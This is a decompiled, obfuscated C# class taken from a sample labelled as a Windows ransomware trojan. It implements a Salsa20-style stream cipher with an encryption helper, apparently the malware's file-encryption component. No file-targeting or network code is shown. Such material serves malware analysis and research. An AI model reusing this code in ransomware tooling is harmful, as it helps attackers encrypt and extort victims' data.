// Decompiled with JetBrains decompiler
// Type: lKwIARJqZgRWh.xdhcRNHRhIrdsES
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace lKwIARJqZgRWh
{
  public sealed class xdhcRNHRhIrdsES : SymmetricAlgorithm
  {
    private int qWPfHvpXlno;
    [NonSerialized]
    internal static GetString \u0083;

    public static byte[] rIPxguvEmEeCvU([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray1 = (byte[]) null;
      byte[] numArray2 = obj1;
      byte[] numArray3 = obj2;
      using (xdhcRNHRhIrdsES xdhcRnhRhIrdsEs = new xdhcRNHRhIrdsES())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          xdhcRnhRhIrdsEs.Key = numArray2;
          xdhcRnhRhIrdsEs.IV = numArray3;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, xdhcRnhRhIrdsEs.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = obj0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          numArray1 = memoryStream.ToArray();
        }
      }
      return numArray1;
    }

    public xdhcRNHRhIrdsES()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.qWPfHvpXlno = 20;
    }

    [SpecialName]
    public override byte[] get_IV() => base.IV;

    [SpecialName]
    public override void set_IV([In] byte[] obj0)
    {
      xdhcRNHRhIrdsES.eSqXbqaWtJNhU(obj0, xdhcRNHRhIrdsES.\u0083(107410120));
      this.IVValue = (byte[]) obj0.Clone();
    }

    public override ICryptoTransform CreateDecryptor([In] byte[] obj0, [In] byte[] obj1) => this.CreateEncryptor(obj0, obj1);

    public override ICryptoTransform CreateEncryptor([In] byte[] obj0, [In] byte[] obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(xdhcRNHRhIrdsES.\u0083(107410111));
      if (!this.ValidKeySize(obj0.Length * 8))
        throw new CryptographicException(xdhcRNHRhIrdsES.\u0083(107410582));
      xdhcRNHRhIrdsES.eSqXbqaWtJNhU(obj1, xdhcRNHRhIrdsES.\u0083(107410553));
      return (ICryptoTransform) new xdhcRNHRhIrdsES.HxndGVdWdFJ(obj0, obj1, this.qWPfHvpXlno);
    }

    public override void GenerateIV() => this.IVValue = xdhcRNHRhIrdsES.MbOaNPlcJMWs(8);

    public override void GenerateKey() => this.KeyValue = xdhcRNHRhIrdsES.MbOaNPlcJMWs(this.KeySize / 8);

    private static void eSqXbqaWtJNhU([In] byte[] obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
      if (obj0.Length != 8)
        throw new CryptographicException(xdhcRNHRhIrdsES.\u0083(107410512));
    }

    private static byte[] MbOaNPlcJMWs([In] int obj0)
    {
      byte[] data = new byte[obj0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    static xdhcRNHRhIrdsES() => Strings.CreateGetStringDelegate(typeof (xdhcRNHRhIrdsES));

    private sealed class HxndGVdWdFJ : ICryptoTransform, IDisposable
    {
      private static readonly byte[] budmDpRdUBUip;
      private static readonly byte[] lxgFLQHLgLg;
      private readonly int qWPfHvpXlno;
      private uint[] LajSCPmwCVj;
      [NonSerialized]
      internal static GetString \u008F;

      public HxndGVdWdFJ([In] byte[] obj0, [In] byte[] obj1, [In] int obj2)
      {
        this.Initialize(obj0, obj1);
        this.qWPfHvpXlno = obj2;
      }

      [SpecialName]
      public bool get_CanReuseTransform() => false;

      [SpecialName]
      public bool get_CanTransformMultipleBlocks() => true;

      [SpecialName]
      public int get_InputBlockSize() => 64;

      [SpecialName]
      public int get_OutputBlockSize() => 64;

      public int TransformBlock([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] byte[] obj3, [In] int obj4)
      {
        if (obj0 == null)
          throw new ArgumentNullException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410500));
        if (obj1 < 0 || obj1 >= obj0.Length)
          throw new ArgumentOutOfRangeException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410451));
        if (obj2 < 0 || obj1 + obj2 > obj0.Length)
          throw new ArgumentOutOfRangeException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410466));
        if (obj3 == null)
          throw new ArgumentNullException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410417));
        if (obj4 < 0 || obj4 + obj2 > obj3.Length)
          throw new ArgumentOutOfRangeException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410432));
        if (this.LajSCPmwCVj == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] numArray = new byte[64];
        int num1 = 0;
        while (obj2 > 0)
        {
          this.Hash(numArray, this.LajSCPmwCVj);
          this.LajSCPmwCVj[8] = xdhcRNHRhIrdsES.HxndGVdWdFJ.AddOne(this.LajSCPmwCVj[8]);
          if (this.LajSCPmwCVj[8] == 0U)
            this.LajSCPmwCVj[9] = xdhcRNHRhIrdsES.HxndGVdWdFJ.AddOne(this.LajSCPmwCVj[9]);
          int num2 = Math.Min(64, obj2);
          for (int index = 0; index < num2; ++index)
            obj3[obj4 + index] = (byte) ((uint) obj0[obj1 + index] ^ (uint) numArray[index]);
          num1 += num2;
          obj2 -= 64;
          obj4 += 64;
          obj1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        byte[] numArray = obj2 >= 0 ? new byte[obj2] : throw new ArgumentOutOfRangeException(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410466));
        this.TransformBlock(obj0, obj1, obj2, numArray, 0);
        return numArray;
      }

      public void Dispose()
      {
        if (this.LajSCPmwCVj != null)
          Array.Clear((Array) this.LajSCPmwCVj, 0, this.LajSCPmwCVj.Length);
        this.LajSCPmwCVj = (uint[]) null;
      }

      private static uint Rotate([In] uint obj0, [In] int obj1) => obj0 << obj1 | obj0 >> 32 - obj1;

      private static uint Add([In] uint obj0, [In] uint obj1) => obj0 + obj1;

      private static uint AddOne([In] uint obj0) => obj0 + 1U;

      private void Hash([In] byte[] obj0, [In] uint[] obj1)
      {
        uint[] numArray = (uint[]) obj1.Clone();
        for (int qWpfHvpXlno = this.qWPfHvpXlno; qWpfHvpXlno > 0; qWpfHvpXlno -= 2)
        {
          numArray[4] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= xdhcRNHRhIrdsES.HxndGVdWdFJ.Rotate(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          xdhcRNHRhIrdsES.HxndGVdWdFJ.ToBytes(xdhcRNHRhIrdsES.HxndGVdWdFJ.Add(numArray[index], obj1[index]), obj0, 4 * index);
      }

      private void Initialize([In] byte[] obj0, [In] byte[] obj1)
      {
        this.LajSCPmwCVj = new uint[16];
        this.LajSCPmwCVj[1] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, 0);
        this.LajSCPmwCVj[2] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, 4);
        this.LajSCPmwCVj[3] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, 8);
        this.LajSCPmwCVj[4] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, 12);
        byte[] numArray = obj0.Length == 32 ? xdhcRNHRhIrdsES.HxndGVdWdFJ.budmDpRdUBUip : xdhcRNHRhIrdsES.HxndGVdWdFJ.lxgFLQHLgLg;
        int num = obj0.Length - 16;
        this.LajSCPmwCVj[11] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, num);
        this.LajSCPmwCVj[12] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, num + 4);
        this.LajSCPmwCVj[13] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, num + 8);
        this.LajSCPmwCVj[14] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj0, num + 12);
        this.LajSCPmwCVj[0] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(numArray, 0);
        this.LajSCPmwCVj[5] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(numArray, 4);
        this.LajSCPmwCVj[10] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(numArray, 8);
        this.LajSCPmwCVj[15] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(numArray, 12);
        this.LajSCPmwCVj[6] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj1, 0);
        this.LajSCPmwCVj[7] = xdhcRNHRhIrdsES.HxndGVdWdFJ.ToUInt32(obj1, 4);
        this.LajSCPmwCVj[8] = 0U;
        this.LajSCPmwCVj[9] = 0U;
      }

      private static uint ToUInt32([In] byte[] obj0, [In] int obj1) => (uint) ((int) obj0[obj1] | (int) obj0[obj1 + 1] << 8 | (int) obj0[obj1 + 2] << 16 | (int) obj0[obj1 + 3] << 24);

      private static void ToBytes([In] uint obj0, [In] byte[] obj1, [In] int obj2)
      {
        obj1[obj2] = (byte) obj0;
        obj1[obj2 + 1] = (byte) (obj0 >> 8);
        obj1[obj2 + 2] = (byte) (obj0 >> 16);
        obj1[obj2 + 3] = (byte) (obj0 >> 24);
      }

      static HxndGVdWdFJ()
      {
        Strings.CreateGetStringDelegate(typeof (xdhcRNHRhIrdsES.HxndGVdWdFJ));
        xdhcRNHRhIrdsES.HxndGVdWdFJ.budmDpRdUBUip = Encoding.ASCII.GetBytes(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410383));
        xdhcRNHRhIrdsES.HxndGVdWdFJ.lxgFLQHLgLg = Encoding.ASCII.GetBytes(xdhcRNHRhIrdsES.HxndGVdWdFJ.\u008F(107410358));
      }
    }
  }
}
